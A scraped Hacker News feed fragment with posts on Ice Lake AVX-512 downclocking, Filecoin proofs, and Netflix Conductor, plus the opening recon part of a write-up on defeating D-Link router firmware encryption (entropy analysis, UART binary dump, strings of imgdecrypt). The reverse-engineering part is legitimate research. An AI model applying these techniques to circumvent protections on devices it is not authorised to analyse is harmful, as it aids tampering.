					Subscribe to receive updates from the Real <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">Science</a> Blog.				</p>

				
			</form>
			
				<p>
					Processing…				</p>
				<p>
					Success! You're on the list.				</p>
				<p>
					Whoops! There was an error and we couldn't process your subscription. Please reload the page and try again.				</p>

					</div>
	</div>
	</div>
					</div></div>]]>
            </description>
            <link>https://realscience.community/2020/08/17/why-i-believe-the-us-has-herd-immunity-in-some-states-and-is-barreling-towards-it-as-a-country/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24215572</guid>
            <pubDate>Wed, 19 Aug 2020 20:04:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ice Lake AVX-512 Downclocking]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 67 (<a href="https://news.ycombinator.com/item?id=24215022">thread link</a>) | @ingve
<br/>
August 19, 2020 | https://travisdowns.github.io/blog/2020/08/19/icl-avx512-freq.html | <a href="https://web.archive.org/web/*/https://travisdowns.github.io/blog/2020/08/19/icl-avx512-freq.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    
<!-- boilerplate 
page.assets: /assets/icl-avx512-freq
assetpath: /assets/icl-avx512-freq
tablepath: /misc/tables/icl-avx512-freq
-->

<p>This is a short post investigating the behavior of AVX2 and AVX-512 related <em>licence-based downclocking</em> on Intel’s newest Ice Lake chips.</p>

<p>Licence-based downclocking<sup id="fnref:tiring" role="doc-noteref"><a href="#fn:tiring">1</a></sup> refers to the <a href="https://blog.cloudflare.com/on-the-dangers-of-intels-frequency-scaling/">semi-famous</a> effect where lower than nominal frequency limits are imposed when certain <abbr title="Single Instruction Multiple Data: an ISA type or ISA extension like Intel's AVX or ARM's NEON that can perform multiple identical operations on elements packed into a SIMD register.">SIMD</abbr> instructions are executed, especially heavy floating point instructions or 512-bit wide instructions.</p>

<p>More details about this type of downclocking are available at <a href="https://stackoverflow.com/a/56861355">this StackOverflow answer</a> and we’ve already <a href="https://travisdowns.github.io/blog/2020/01/17/avxfreq1.html">covered in somewhat exhaustive detail</a> the low level mechanics of these transitions. You can also find <a href="https://lemire.me/blog/2018/09/07/avx-512-when-and-how-to-use-these-new-instructions/">some guidelines</a> on to how make use of wide <abbr title="Single Instruction Multiple Data: an ISA type or ISA extension like Intel's AVX or ARM's NEON that can perform multiple identical operations on elements packed into a SIMD register.">SIMD</abbr> given this issue<sup id="fnref:dmore" role="doc-noteref"><a href="#fn:dmore">2</a></sup>.</p>

<p>All of those were written in the context of Skylake-SP (<abbr title="Intel's Skylake (server) architecture including Skylake-SP, Skylake-X and Skylake-W">SKX</abbr>) which were the first generation of chips to support AVX-512.</p>

<p>So what about Ice Lake, the newest chips which support both the <abbr title="Intel's Skylake (server) architecture including Skylake-SP, Skylake-X and Skylake-W">SKX</abbr> flavor of AVX-512 and also have a <a href="https://branchfree.org/2019/05/29/why-ice-lake-is-important-a-bit-bashers-perspective/">whole host of new AVX-512 instructions</a>? Will we be stuck gazing longly at these new instructions from afar while never being allowed to actually use them due to downclocking?</p>

<p>Read on to find out, or just skip to the <a href="#summary">end</a>.</p>

<h3 id="avx-turbo">AVX-Turbo</h3>

<p>We will use the <a href="https://github.com/travisdowns/avx-turbo">avx-turbo</a> utility to measure the core count and instruction mix dependent frequencies for a CPU. This tools works in a straightforward way: run a given mix of instructions on the given number of cores, while measuring the frequency achieved during the test.</p>

<p>For example, the <code>avx256_fma_t</code> test – which measures the cost of <em>heavy</em> 256-bit instructions with high <abbr title="Instruction level parallelism: a measure of inter-instruction parallelism on a superscalar CPU">ILP</abbr> – runs the following sequence of FMAs:</p>

<div><div><pre><code>	<span>vfmadd132pd</span> <span>ymm0</span><span>,</span><span>ymm10</span><span>,</span><span>ymm11</span>
	<span>vfmadd132pd</span> <span>ymm1</span><span>,</span><span>ymm10</span><span>,</span><span>ymm11</span>
	<span>vfmadd132pd</span> <span>ymm2</span><span>,</span><span>ymm10</span><span>,</span><span>ymm11</span>
	<span>vfmadd132pd</span> <span>ymm3</span><span>,</span><span>ymm10</span><span>,</span><span>ymm11</span>
	<span>vfmadd132pd</span> <span>ymm4</span><span>,</span><span>ymm10</span><span>,</span><span>ymm11</span>
	<span>vfmadd132pd</span> <span>ymm5</span><span>,</span><span>ymm10</span><span>,</span><span>ymm11</span>
	<span>vfmadd132pd</span> <span>ymm6</span><span>,</span><span>ymm10</span><span>,</span><span>ymm11</span>
	<span>vfmadd132pd</span> <span>ymm7</span><span>,</span><span>ymm10</span><span>,</span><span>ymm11</span>
	<span>vfmadd132pd</span> <span>ymm8</span><span>,</span><span>ymm10</span><span>,</span><span>ymm11</span>
	<span>vfmadd132pd</span> <span>ymm9</span><span>,</span><span>ymm10</span><span>,</span><span>ymm11</span>
	<span>; repeat 10x for a total of 100 FMAs</span>
</code></pre></div></div>

<p>In total, we’ll use five tests to test every combination of light and heavy 256-bit and 512-bit instructions, as well as scalar instructions (128-bit <abbr title="Single Instruction Multiple Data: an ISA type or ISA extension like Intel's AVX or ARM's NEON that can perform multiple identical operations on elements packed into a SIMD register.">SIMD</abbr> behaves the same as scalar), using this command line:</p>

<div><div><pre><code>./avx-turbo --test=scalar_iadd,avx256_iadd,avx512_iadd,avx256_fma_t,avx512_fma_t
</code></pre></div></div>

<h3 id="ice-lake-results">Ice Lake Results</h3>

<p>I ran avx-turbo as described above on an Ice Lake i5-1035G4, which is the middle-of-the-range Ice Lake client CPU running at up to 3.7 GHz. The full output is <a href="https://gist.github.com/travisdowns/c53f40fc4dbbd944f5613eaab78f3189#file-icl-turbo-results-txt">hidden away in a gist</a>, but here are the all-important frequency results (all values in GHz):</p>

<table>
	<tbody>
		<tr>
			<th rowspan="2">Instruction Mix</th>
			<th colspan="4">Active Cores</th>
		</tr>
		<tr>
			<th>1</th>
			<th>2</th>
			<th>3</th>
			<th>4</th>
		</tr>
		<tr>
			<td>Scalar/128-bit</td>
			<td>3.7</td>
			<td>3.6</td>
			<td>3.3</td>
			<td>3.3</td>
		</tr>
		<tr>
			<td>Light 256-bit</td>
			<td>3.7</td>
			<td>3.6</td>
			<td>3.3</td>
			<td>3.3</td>
		</tr>
		<tr>
			<td>Heavy 256-bit</td>
			<td>3.7</td>
			<td>3.6</td>
			<td>3.3</td>
			<td>3.3</td>
		</tr>
		<tr>
			<td>Light 512-bit</td>
			<td>3.6</td>
			<td>3.6</td>
			<td>3.3</td>
			<td>3.3</td>
		</tr>
    	<tr>
			<td>Heavy 512-bit</td>
			<td>3.6</td>
			<td>3.6</td>
			<td>3.3</td>
			<td>3.3</td>
		</tr>
	</tbody>
</table>

<p>As expected, maximum frequency decreases with active core count, but scan down each column to see the effect of instruction category. Along this axis, there is almost no downclocking at all! Only for a single active core count is there any decrease with wider instructions, and it is a paltry only 100 MHz: from 3,700 MHz to 3,600 MHz when any 512-bit instructions are used.</p>

<p>In any other scenario, including any time more than one core is active, or for heavy 256-bit instructions, there is <em>zero</em> licence-based downclocking: everything runs as fast as scalar.</p>

<h4 id="licence-mapping">Licence Mapping</h4>

<p>There another change here too. In <abbr title="Intel's Skylake (server) architecture including Skylake-SP, Skylake-X and Skylake-W">SKX</abbr>, there are three licences, or categories of instructions with respect to downclocking: L0, L1 and L2. Here, in client ICL, there are only two<sup id="fnref:visible" role="doc-noteref"><a href="#fn:visible">3</a></sup> and those don’t line up exactly with the three in <abbr title="Intel's Skylake (server) architecture including Skylake-SP, Skylake-X and Skylake-W">SKX</abbr>.</p>

<p>To be clearer, in <abbr title="Intel's Skylake (server) architecture including Skylake-SP, Skylake-X and Skylake-W">SKX</abbr> the licences mapped to instruction width and weight as follows:</p>



<table>
	<tbody>
		<tr>
			<th>Width</th>
			<th>Light</th>
			<th>Heavy</th>
		</tr>
		<tr>
			<td>Scalar/128</td>
			<td>L0</td>
			<td>L0</td>
		</tr>
		<tr>
			<td>256</td>
			<td>L0</td>
			<td>L1</td>
		</tr>
		<tr>
			<td>512</td>
			<td>L1</td>
			<td>L2</td>
		</tr>
	</tbody>
</table>

<p>In particular, note that 256-bit heavy instructions have the same licence as 512-bit light.</p>

<p>In ICL client, the mapping is:</p>

<table>
	<tbody>
		<tr>
			<th>Width</th>
			<th>Light</th>
			<th>Heavy</th>
		</tr>
		<tr>
			<td>Scalar/128</td>
			<td>L0</td>
			<td>L0</td>
		</tr>
		<tr>
			<td>256</td>
			<td>L0</td>
			<td>L0</td>
		</tr>
		<tr>
			<td>512</td>
			<td>L1</td>
			<td>L1</td>
		</tr>
	</tbody>
</table>

<p>Now, 256 heavy and 512 light are in different categories! In fact, the whole concept of light vs heavy doesn’t seem to apply here: the categorization is purely based on the width<sup id="fnref:onefma" role="doc-noteref"><a href="#fn:onefma">4</a></sup>.</p>

<h3 id="so-what">So What?</h3>

<p>Well, so what?</p>

<p>At least, it means we need to adjust our mental model of the frequency related cost of AVX-512 instructions. Rather than “generally causing significant downclocking”, on this Ice Lake chip we can say that AVX-512 causes insignicant or zero licence-based downclocking and I expect this to be true on other Ice Lake client chips as well.</p>

<p>Now, this adjustment of expectations comes with an important caveat: licence-based downclocking is only <em>one</em> source of downclocking. It is also possible to hit power, thermal or current limits. Some configurations may only be able to run wide <abbr title="Single Instruction Multiple Data: an ISA type or ISA extension like Intel's AVX or ARM's NEON that can perform multiple identical operations on elements packed into a SIMD register.">SIMD</abbr> instructions on all cores for a short period of time before exceeding running power limits. In my case, the $250 laptop I’m testing this on has extremely poor cooling and rather than power limits I hit thermal limits (100°C limit) within a few seconds running anything heavy on all cores.</p>

<p>However, these other limits are qualitatively different than licence based limits. They apply mostly<sup id="fnref:voltage" role="doc-noteref"><a href="#fn:voltage">5</a></sup> in a <em>pay for what you use</em> way: if you use a wide or heavy instruction or two you incur only a microscopic amount of additional power or heat cost associated with only those instructions. This is unlike some licence-based transitions where a core or chip-wide transition occurs that affects unrelated subsequent execution for a significant period of time.</p>

<p>Since wider operations are generally <em>cheaper</em> in power than an equivalent number of narrower operations<sup id="fnref:widenarrow" role="doc-noteref"><a href="#fn:widenarrow">6</a></sup>, you can determine up-front that a wide operation is <em>worth it</em> – at least for cases that scale well with width. In any case, the problem is most local: not depending on the behavior of the surrounding code.</p>

<h3 id="summary">Summary</h3>

<p>Here’s what we’ve learned.</p>

<ul>
  <li>The Ice Lake i5-1035 CPU exhibits only 100 MHz of licence-based downclock with 1 active core when running 512-bit instructions.</li>
  <li>There is no downclock in any other scenario.</li>
  <li>The all-core 512-bit turbo frequency of 3.3 GHz is 89% of the maximum single-core scalar frequency of 3.7 GHz, so within power and thermal limits this chip has a very “flat” frequency profile.</li>
  <li>Unlike <abbr title="Intel's Skylake (server) architecture including Skylake-SP, Skylake-X and Skylake-W">SKX</abbr>, this Ice Lake chip does not distinguish between “light” and “heavy” instructions for frequency scaling purposes: FMA operations behave the same as lighter operations.</li>
</ul>

<p>So on ICL client, you don’t have to fear the downclock. Only time will tell if this applies also to ICL server.</p>

<h3 id="thanks">Thanks</h3>

<p>Stopwatch photo by <a href="https://unsplash.com/@kmaillefer">Kevin Maillefer</a> on <a href="https://unsplash.com/s/photos/stopwatch">Unsplash</a>.</p>

<h3 id="discussion-and-feedback">Discussion and Feedback</h3>

<p>You can discuss this post <a href="https://news.ycombinator.com/item?id=24215022">on Hacker News</a>.</p>

<p>If you have a question or any type of feedback, you can leave a <a href="#comment-section">comment below</a>. I’m also interested in results on <em>other</em> ICL chips, like the i3 and i7 variants: let me know if you have one of those and we can collect results.</p>

<p>If you liked this post, check out the <a href="https://travisdowns.github.io/">homepage</a> for others you might enjoy.</p>

<hr>
<hr>




  </div><!-- travis override -->
  
    





  

  
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://travisdowns.github.io/blog/2020/08/19/icl-avx512-freq.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24215022</guid>
            <pubDate>Wed, 19 Aug 2020 19:25:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Filecoin: Proof of Storage Systems]]>
            </title>
            <description>
<![CDATA[
Score 92 | Comments 49 (<a href="https://news.ycombinator.com/item?id=24214758">thread link</a>) | @simonebrunozzi
<br/>
August 19, 2020 | https://blog.coinlist.co/deep-dive-into-filecoin/ | <a href="https://web.archive.org/web/*/https://blog.coinlist.co/deep-dive-into-filecoin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                
                <figure><img src="https://blog.coinlist.co/content/images/2020/08/filecoin_deep_dive_blog@2x--1-.png" alt="" srcset="https://blog.coinlist.co/content/images/size/w600/2020/08/filecoin_deep_dive_blog@2x--1-.png 600w, https://blog.coinlist.co/content/images/size/w1000/2020/08/filecoin_deep_dive_blog@2x--1-.png 1000w, https://blog.coinlist.co/content/images/size/w1600/2020/08/filecoin_deep_dive_blog@2x--1-.png 1600w, https://blog.coinlist.co/content/images/2020/08/filecoin_deep_dive_blog@2x--1-.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>Last week, we discussed <a href="https://blog.coinlist.co/filecoin-why-its-a-big-deal/">why we think Filecoin is a big milestone</a> in the evolution of the Internet and outlined 4 key reasons why Filecoin can succeed, namely: </p><ul><li>The founding team’s experience at Protocol Labs</li><li>Significantly lowering data storage costs</li><li>Properly designed incentives</li><li>Resilience and censorship resistance</li></ul><p>This week, we sat down with the Filecoin team to discuss the project in greater detail and present a more comprehensive look at how Filecoin will return data storage to its naturally free and private state. This is part one of a multi-part series. </p><p><strong>1. What is Filecoin? </strong></p><p>Filecoin is a decentralized storage marketplace to preserve humanity’s most important data.</p><p><strong>2. What problem is Filecoin trying to solve?</strong> </p><p>We created Filecoin because the amount of data humans generate is exponentially increasing, and we need more efficient ways to store and access it. We’re putting vast amounts of storage resources spread all across the globe to work to help solve that problem.</p><p><strong>3. To operate successfully, the Filecoin decentralized storage network (DSN) requires 3 key properties: public verifiability, auditability, and incentive-compatibility. Can you provide insight into what those 3 properties mean in the context of the project? </strong></p><p>Filecoin lets users select from a vast, decentralized marketplace of storage providers and choose the one that best suits their price, performance, and location requirements. It lets storage and retrieval providers operate “plug-and-play” cloud storage platforms that, spread across many users, can provide meaningful competition to large, centralized services. And it provides strong guarantees about the integrity of clients’ data and the fact that it has been stored reliably over time.</p><div><p><strong>4. Filecoin seeks to achieve public verifiability and auditability through this notion of Proof-of-Storage. According to Filecoin’s documentation, Filecoin achieves Proof of Storage through the implementations of Proof of Replication (PoRep) and Proof of Spacetime (PoSt). What is Proof of Replication and how does it work in practice?</strong></p><p>In a Proof-of-Replication, a storage miner proves that they are storing a physically unique copy, or replica, of the data. Proof-of-Replication happens just once, at the time the data is first stored by the miner.</p></div><p>As the storage miner receives each piece of client data, they place it into a sector. Sectors are the fundamental units of storage in Filecoin, and can contain pieces from multiple deals and clients.</p><p>Next, a process called sealing takes place. During sealing, the sector data is encoded through a sequence of graph and hashing processes to create a unique replica. The encoding process is designed to be slow and computationally heavy, making it difficult to spoof. (Note that encoding is not the same as encryption. If you want to store private data, you must encrypt it before adding it to the Filecoin network.) The sealing process also compresses the Proof of Replication using zk-SNARKs to keep the chain smaller so that it can be stored by all members of the Filecoin network for verification purposes.</p><p><strong>5. <strong><strong>What is Proof-of-Spacetime and how does it work in practice? </strong></strong></strong></p><p>Whereas Proof-of-Replication is run once to prove that a miner stored a physically unique copy of the data at the time the sector was sealed, Proof-of-Spacetime (PoSt) is run repeatedly to prove that they are continuing to dedicate storage space to that same data over time.</p><p>First, PoSt randomly selects some leaf nodes of the encoded replica and runs merkle inclusion proofs on them to show that the miner has the specific bytes that should be there.</p><p>Then, the miner generates a proof that they know of a root for the replica which both agrees with the inclusion proofs and can be used to derive a publicly-known piece of data known as a “CommR.” The CommR can be used by anyone to verify the validity of the miner’s proofs.</p><p>The final stage of PoSt compresses these proofs into a single zk-SNARK, which allows it to be included in the public chain in a space-efficient way.</p><p><a href="https://coinlist.co/filecoin">Become an early adopter of Filecoin on Day 1 »</a></p><hr><p><em>Legal Notice</em></p><p><em>This blog post is being distributed by Amalgamated Token Services Inc., dba “CoinList,” or one of its subsidiaries. This blog post and use of the CoinList website is subject to certain disclosures, restrictions and risks, available </em><a href="https://coinlist.co/disclaimers" rel="noopener nofollow noopener"><em>here</em></a><em>.</em></p>
              </div></div>]]>
            </description>
            <link>https://blog.coinlist.co/deep-dive-into-filecoin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24214758</guid>
            <pubDate>Wed, 19 Aug 2020 19:08:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Netflix Conductor: Open-source workflow orchestration engine]]>
            </title>
            <description>
<![CDATA[
Score 240 | Comments 68 (<a href="https://news.ycombinator.com/item?id=24214735">thread link</a>) | @swyx
<br/>
August 19, 2020 | https://netflix.github.io/conductor/ | <a href="https://web.archive.org/web/*/https://netflix.github.io/conductor/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

  <div>

    
    <nav data-toggle="wy-nav-shift">
      

      
      &nbsp;
    </nav>

    <section data-toggle="wy-nav-shift">

      
      <nav role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top"></i>
        <a href="https://netflix.github.io/conductor/">Conductor</a>
      </nav>

      
      <div>
        <div>
          
          <div role="main">
            <div>
              
                <center><img alt="Logo" src="https://netflix.github.io/conductor/img/conductor-vector-x.png"></center>
<center><img alt="Logo" src="https://netflix.github.io/conductor/img/corner-logo-oss.png"></center>
<center><strong>Conductor is a <em>Workflow Orchestration engine</em> that runs in the cloud.</strong> </center>
<h2 id="motivation">Motivation<a href="#motivation" title="Permanent link">¶</a></h2>
<p>We built Conductor to help us orchestrate microservices based process flows at Netflix with the following features:</p>
<ul>
<li>A distributed server ecosystem, which stores workflow state information efficiently.</li>
<li>Allow creation of process / business flows in which each individual task can be implemented by the same / different microservices.</li>
<li>A JSON DSL based blueprint defines the execution flow.</li>
<li>Provide visibility and traceability into these process flows.</li>
<li>Simple interface to connect workers, which execute the tasks in workflows.</li>
<li>Full operational control over workflows with the ability to pause, resume, restart, retry and terminate.</li>
<li>Allow greater reuse of existing microservices providing an easier path for onboarding.</li>
<li>User interface to visualize, replay and search the process flows.</li>
<li>Ability to scale to millions of concurrently running process flows.</li>
<li>Backed by a queuing service abstracted from the clients.</li>
<li>Be able to operate on HTTP or other transports e.g. gRPC.</li>
<li>Event handlers to control workflows via external actions.</li>
<li>Client implementations in Java, Python and other languages.</li>
<li>Various configurable properties with sensible defaults to fine tune workflow and task executions like rate limiting, concurrent execution limits etc.</li>
</ul>
<p><strong>Why not peer to peer choreography?</strong></p>
<p>With peer to peer task choreography, we found it was harder to scale with growing business needs and complexities.
Pub/sub model worked for simplest of the flows, but quickly highlighted some of the issues associated with the approach:</p>
<ul>
<li>Process flows are “embedded” within the code of multiple application.</li>
<li>Often, there is tight coupling and assumptions around input/output, SLAs etc, making it harder to adapt to changing needs.</li>
<li>Almost no way to systematically answer “How much are we done with process X”?</li>
</ul>
              
            </div>
          </div>
          
      
        </div>
      </div>

    </section>

  </div>

  
    
    
      





</div>]]>
            </description>
            <link>https://netflix.github.io/conductor/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24214735</guid>
            <pubDate>Wed, 19 Aug 2020 19:06:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Breaking the D-Link DIR3060 Firmware Encryption – Recon – Part 1]]>
            </title>
            <description>
<![CDATA[
Score 83 | Comments 19 (<a href="https://news.ycombinator.com/item?id=24213347">thread link</a>) | @dvaun
<br/>
August 19, 2020 | https://0x434b.dev/breaking-the-d-link-dir3060-firmware-encryption-recon-part-1/ | <a href="https://web.archive.org/web/*/https://0x434b.dev/breaking-the-d-link-dir3060-firmware-encryption-recon-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>Recently we came across some firmware samples from D-Link routers that we were unable to unpack properly. Luckily we got our hands on an older, cheaper but similar device (DIR882) that we were able to analyze more closely. The goal is to find a way to mitigate the firmware encryption that was put in place to prevent tampering and static analysis. This series highlights the results and necessary steps to write a custom decryption routine that actually works for a bunch of other models as well but more about that later on. First let's take a look at the problem.</p><h2 id="the-problem-">The problem:</h2><p>The latest D-Link 3060 firmware (as of time of writing) can be downloaded from <a href="https://support.dlink.com/productinfo.aspx?m=DIR-3060-US">here</a>. I'll be examining <em>v1.02B03</em>, which was released on 10/22/19. A brief initial analysis shows the following:</p><pre><code>&gt; md5sum DIR-3060_RevA_Firmware111B01.bin
86e3f7baebf4178920c767611ec2ba50  DIR3060A1_FW102B03.bin

&gt; file DIR-3060_RevA_Firmware111B01.bin
DIR3060A1_FW102B03.bin: data

&gt; binwalk DIR-3060_RevA_Firmware111B01.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

&gt; hd -n 128 DIR-3060_RevA_Firmware111B01.bin
00000000  53 48 52 53 01 13 1f 9e  01 13 1f a0 67 c6 69 73  |SHRS........g.is|
00000010  51 ff 4a ec 29 cd ba ab  f2 fb e3 46 2e 97 e7 b1  |Q.J.)......F....|
00000020  56 90 b9 16 f8 0c 77 b8  bf 13 17 46 7b e3 c5 9c  |V.....w....F{...|
00000030  39 b5 59 6b 75 8d b8 b0  a3 1d 28 84 33 13 65 04  |9.Yku.....(.3.e.|
00000040  61 de 2d 56 6f 38 d7 eb  43 9d d9 10 eb 38 20 88  |a.-Vo8..C....8 .|
00000050  1f 21 0e 41 88 ff ee aa  85 46 0e ee d7 f6 23 04  |.!.A.....F....#.|
00000060  fa 29 db 31 9c 5f 55 68  12 2e 32 c3 14 5c 0a 53  |.).1._Uh..2..\.S|
00000070  ed 18 24 d0 a6 59 c0 de  1c f3 8b 67 1d e6 31 36  |..$..Y.....g..16|
00000080
</code></pre><p>So all we got from the file command is that we have some form of (binary) data file at hand, which is not very useful. Our goto choice for initial recon: binwalk is also unable to identify any file sections within the firmware image, not even any false positives. Lastly the hex dump of the first 128 bytes shows seemingly random data right from offset 0x0. All of these are indicators of an encrypted image, which an entropy analysis can confirm:</p><pre><code>&gt; binwalk -E DIR-3060_RevA_Firmware111B01.bin

DECIMAL       HEXADECIMAL     ENTROPY
--------------------------------------------------------------------------------
0             0x0             Rising entropy edge (0.978280)
</code></pre><figure><img src="https://0x434b.dev/content/images/2020/06/entropy.png" alt="init_Entropy"></figure><p>There's not a single drop in the entropy curve leaving no room for us to extract any kind of information about the target...</p><h2 id="the-attempt-">The attempt:</h2><p>As we were reluctant to buy the <a href="https://www.dlink.com/en/products/dir-3060-exo-ac3000-smart-mesh-wi-fi-router">D-Link DIR 3060</a> for around ~$200 we checked similar models from D-Link that were on the cheaper side with the goal to find at least one alternative that deploys the same encryption scheme. In the end we came across the <a href="https://www.dlink.com/en/products/dir-882-exo-ac2600-mu-mimo-wi-fi-router">D-Link DIR 882</a>, which was considerable cheaper.</p><p>On a side note, even when we weren't able to find a similar encryption scheme looking at different firmware headers could have provided some hints on what their goto mechanic to <em>'secure'</em> their firmware looks like.</p><p>As we stumbled upon the DIR 882, we checked the firmware v1.30B10 that was released on 02/20/20 and it shows the same behavior as the one from the big brother the DIR3060, including the constant entropy of nearly 1. One thing that the invested reader might notice is the same 4-byte sequence at the start "SHRS". We will come to that one later.</p><pre><code>&gt; md5sum DIR_882_FW120B06.BIN
89a80526d68842531fe29170cbd596c3  DIR_882_FW120B06.BIN

&gt; file DIR_882_FW120B06.BIN
DIR_882_FW120B06.BIN: data

&gt; binwalk DIR_882_FW120B06.BIN

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

&gt; hd -n 128 DIR_882_FW120B06.BIN
00000000  53 48 52 53 00 d1 d9 a6  00 d1 d9 b0 67 c6 69 73  |SHRS........g.is|
00000010  51 ff 4a ec 29 cd ba ab  f2 fb e3 46 fd a7 4d 06  |Q.J.)......F..M.|
00000020  a4 66 e6 ad bf c4 9d 13  f3 f7 d1 12 98 6b 2a 35  |.f...........k*5|
00000030  1d 0e 90 85 b7 83 f7 4d  3a 2a 25 5a b8 13 0c fb  |.......M:*%Z....|
00000040  2a 17 7a b2 99 04 60 66  eb c2 58 98 82 74 08 e3  |*.z...`f..X..t..|
00000050  54 1e e2 51 44 42 e8 d6  8e 46 6e 2c 16 57 d3 0b  |T..QDB...Fn,.W..|
00000060  07 d7 7c 9e 11 ec 72 1d  fb 87 a2 5b 18 ec 53 82  |..|...r....[..S.|
00000070  85 b9 84 39 b6 b4 dd 85  de f0 28 3d 36 0e be aa  |...9......(=6...|
00000080
</code></pre><figure><img src="https://0x434b.dev/content/images/2020/06/entropy_DIR882.png" alt="dir882_entropy"></figure><p>Another thing this firmware confirms for us is that the same crypto scheme is still used in early 2020.</p><h2 id="the-solution-">The solution:</h2><p>Once we acquired the DIR882 we were able to enter a serial console on the device and look around the file systems for any clues and candidates that handles the en-/decryption of firmware updates (Attaching to the UART console is out of scope for this article and not particular interesting as it involves no 'hardware hacking' besides attaching 4 cables..) We quickly were able to identify a suitable candidate:</p><pre><code>&gt; file imgdecrypt
imgdecrypt: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, stripped

&gt; md5sum imgdecrypt
a5474af860606f035e4b84bd31fc17a1  imgdecrypt
</code></pre><p>As we were just interested in this particular binary we dumped it the cruelest way possible:</p><pre><code>&gt; base64 &lt; imgdecrypt
</code></pre><p>After copying the output to our local machine and converting the base64 back to binary we can start taking a closer look!</p><h3 id="binary-reconnaissance-">Binary Reconnaissance:</h3><p>We have already seen above that we're dealing with a 32-bit ELF binary for MIPS, which is dynamically linked (as expected) and stripped. Let's see what good old <code>strings</code> can do for us here:</p><pre><code>&gt; strings -n 10 imgdecrypt | uniq
/lib/ld-uClibc.so.0
[...]
SHA512_Init
SHA512_Update
SHA512_Final
RSA_verify
AES_set_encrypt_key
AES_cbc_encrypt
AES_set_decrypt_key
PEM_write_RSAPublicKey
OPENSSL_add_all_algorithms_noconf
PEM_read_RSAPublicKey
PEM_read_RSAPrivateKey
RSA_generate_key
EVP_aes_256_cbc
PEM_write_RSAPrivateKey
decrypt_firmare
encrypt_firmare
[...]
libcrypto.so.1.0.0
[...]
no image matic found
check SHA512 post failed
check SHA512 before failed %d %d
check SHA512 vendor failed
static const char *pubkey_n = "%s";
static const char *pubkey_e = "%s";
Read RSA private key failed, maybe the key password is incorrect
/etc_ro/public.pem
%s &lt;sourceFile&gt;
/tmp/.firmware.orig
0123456789ABCDEF
%s sourceFile destFile
[...]
</code></pre><p>Sweet! There is still a lot of useful stuff in there. I just removed the garbage lines indicated by the "[...]". Most note-worthy are the following things:</p><ul><li>Uses uClibc and libcrypto</li><li>Calculates/Checks SHA512 hash digests</li><li>Uses AES_CBC mode to en-/decrypt things</li><li>Has an RSA certificate check with the certificate path pinned to /etc_ro/public.pem</li><li>The RSA private key is protected by a password</li><li>/tmp/.firmware.orig could be a hint towards where things get temporarily decrypted to</li><li>General usage of imgdecrypt binary</li></ul><p>So far we already learned multiple interesting things that should help us further down the road!</p><ol><li>D-Link probably re-uses the same encryption scheme across multiple devices.</li><li>These devices are based on the MIPS32 architecture</li><li>(Access to a UART serial console on the DIR 882 is doable without a problem)</li><li>Linked against uClibc and libcrypto<br>4.1 Potential usage of AES, RSA, and SHA512 routines</li><li>Binary seems to be responsible for both en- and decryption</li><li>There is a public certificate</li><li>The usage of imgdecrypt seems to be ./imgdecrypt myInFile</li><li>Usage of a /tmp/ path for storing results?</li></ol><p>Next up we will dive into the static analysis of the <code>imgdecrypt</code> binary to understand how firmware updates are controlled! But before that for those of you who feel a bit rusty/are new to MIPS32 assembly language here is a short primer on it.</p><h2 id="primer-on-mips32-disassembly">Primer on MIPS32 disassembly</h2><p>Most of you are most likely familiar with x86/x86_64 disassembly so here are a few general rules on how MIPS does things and how its different from the x86 world. First there are two calling conventions (O32 vs N32/N64). I'll be discussing the O32 one as it seems to be the most common one around. Discussing all of these in depths would be out of scope for this article!</p><h3 id="registers-">Registers:</h3><p>In MIPS32 there are 32 registers you can use. The O32 calling convention defines them as follows:</p><pre><code>+---------+-----------+------------------------------------------------+
|   Name  |   Number  |                  Usage                         |
+----------------------------------------------------------------------+
|  $zero  |  $0       |  Is always 0, writes to it are discarded.      |
+----------------------------------------------------------------------+
|  $at    |  $1       |  Assembler temporary register (pseudo instr.)  |
+----------------------------------------------------------------------+
| $v0─$v1 |  $2─$3    |  Function returns/expression evaluation        |
+----------------------------------------------------------------------+
| $a0─$a3 |  $4─$7    |  Function arguments, remaining are in stack    |
+----------------------------------------------------------------------+
| $t0─$t7 |  $8─$15   |  Temporary registers                           |
+----------------------------------------------------------------------+
| $s0─$s7 |  $16─$23  |  Saved temporary registers                     |
+----------------------------------------------------------------------+
| $t8─$t9 |  $24─$25  |  Temporary registers                           |
+----------------------------------------------------------------------+
